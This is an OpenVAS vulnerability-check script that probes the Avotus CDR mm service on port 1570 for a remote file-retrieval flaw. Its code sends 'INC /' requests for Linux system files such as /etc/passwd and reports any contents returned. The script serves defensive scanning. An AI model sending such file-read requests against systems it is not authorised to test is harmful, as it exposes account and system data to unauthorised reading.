###############################################################################
# OpenVAS Vulnerability Test
# $Id: avotus_mm.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Avotus mm File Retrieval attempt
#
# Authors:
# Anonymous
#
# Copyright:
# Copyright (C) 2004 Anonymous
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11948");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Avotus mm File Retrieval attempt");
  script_category(ACT_ATTACK);
  script_copyright("Anonymous");
  script_family("Remote file access");
  script_dependencies("find_service.nasl", "os_detection.nasl");
  script_require_ports(1570, "Services/avotus_mm");
  script_require_keys("Host/runs_unixoide");

  script_tag(name:"solution", value:"The vendor has provided a fix for this issue to all customers.
  The fix will be included in future shipments and future versions of the product.
  If an Avotus customer has any questions about this problem, they should contact
  support@avotus.com.");

  script_tag(name:"summary", value:"The script attempts to force the remote Avotus CDR mm service to include
  the file /etc/passwd across the network.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");

port = get_kb_item("Services/avotus_mm");
if(!port) port = 1570;
if(!get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if(!soc) exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  send(socket:soc, data:"INC /" + file + "\n");
  res = recv(socket:soc, length:65535);
  if(egrep(pattern:pattern, string:res)) {
    close(soc);
    report  = "The Avotus CDR mm service allows any file to be retrieved remotely.";
    report += ' Here is an excerpt from the remote "/' + file + '" file :\n\n' +res;
    security_message(port:port, data:report);
    exit(0);
  }
}

close(soc);
exit(99);